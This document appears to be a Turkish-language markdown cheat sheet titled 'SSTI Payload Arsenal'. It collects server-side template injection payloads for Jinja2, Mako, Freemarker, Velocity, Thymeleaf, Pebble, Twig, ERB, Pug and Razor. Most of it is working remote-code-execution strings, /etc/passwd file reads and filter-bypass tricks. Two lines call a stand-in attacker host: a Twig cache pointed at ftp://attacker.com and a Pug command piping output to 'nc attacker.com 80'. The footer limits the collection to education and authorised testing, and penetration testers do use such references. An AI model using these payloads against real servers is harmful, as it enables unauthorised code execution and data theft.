# 🔥 SSTI (Sunucu Taraflı Şablon Enjeksiyonu) Payload Koleksiyonu

[🇬🇧 English](../SSTI.md)

```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                     Server-Side Template Injection
```

---

## 🔍 Tespit Payload'ları (Detection)

### Evrensel Tespit Testleri
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> Yanıtta matematiksel işlemin sonucu olan `49` değerini görüyorsanız hedef sistemde SSTI zafiyeti mevcuttur!

### Şablon Motorunu Belirleme (Template Engine Identification)
```
{{7*'7'}}         → Jinja2/Twig 7777777 sonucunu üretir
${7*7}            → Freemarker / Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

## 🐍 Python (Jinja2)

### Tespit
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

### Uzaktan Kod Çalıştırma (RCE) Payload'ları
```python
# Yöntem 1 - config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Yöntem 2 - cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Yöntem 3 - MRO (En yaygın yöntem)
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# Yöntem 4 - lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Yöntem 5 - Request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Dosya Okuma
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

### Filtre Atlatma (Filter Bypass)
```python
# attr filtresi kullanarak
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# join filtresi kullanarak
{%set x=''|join('')|attr('__class__')%}

# Hex kodlama kullanarak
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

## ☕ Java (Freemarker)

### Tespit
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

### RCE Payload'ları
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Basit Kod Yürütme
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

## 🌱 Java (Thymeleaf)

### Tespit
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### RCE Payload'ları
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

## 🐦 PHP (Twig)

### Tespit
```php
{{7*7}}
{{7*'7'}}  → 7777777 (dizgi çarpımı)
{{dump(app)}}
{{_self}}
```

### RCE Payload'ları
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

### Dosya Okuma
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

## 💎 Ruby (ERB)

### Tespit
```ruby
<%= 7*7 %>
<%= self %>
```

### RCE Payload'ları
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

## 🟢 Node.js (Jade/Pug)

### Tespit
```javascript
#{7*7}
-var x = 1; p= x
```

### RCE Payload'ları
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

## 📊 Hızlı Başvuru Tablosu

| Şablon Motoru | Tespit İfadesi | Örnek RCE |
|-----------------|----------------|-----------|
| Jinja2 | `{{7*7}}` | `{{config.__class__...}}` |
| Twig | `{{7*'7'}}` | `{{_self.env...}}` |
| Freemarker | `${7*7}` | `<#assign ex=...>` |
| Velocity | `$class.class` | `#set($rt=...)` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |
| Pug | `#{7*7}` | `#{global.process...}` |

---

## 🛡️ Filtre Atlatma Teknikleri

### Engellenen Anahtar Kelimeler (Blocked Keywords)
```python
# Request parametrelerini kullanma
{{request.args.cmd}}?cmd=__class__

# Dizgi birleştirme
{{''['__cla'+'ss__']}}

# Hex kodlama
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Engellenen Süslü Parantezler (Blocked Brackets)
```python
{%print(7*7)%}
```

---

## 📚 Kaynaklar

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 SSTI Payload Arsenal</b><br>
  <i>Yalnızca eğitim ve yetkili güvenlik testleri amaçlıdır!</i>
</p>
